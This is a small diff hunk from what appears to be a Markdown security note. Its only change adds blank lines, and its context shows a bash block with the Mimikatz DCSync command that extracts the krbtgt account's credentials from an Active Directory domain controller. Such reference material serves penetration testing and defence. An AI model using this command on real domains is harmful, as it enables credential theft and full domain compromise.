@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:26:16.822815+00:00'
 ```bash
 mimikatz> lsadump::dcsync /user:krbtgt
 ```
+
+
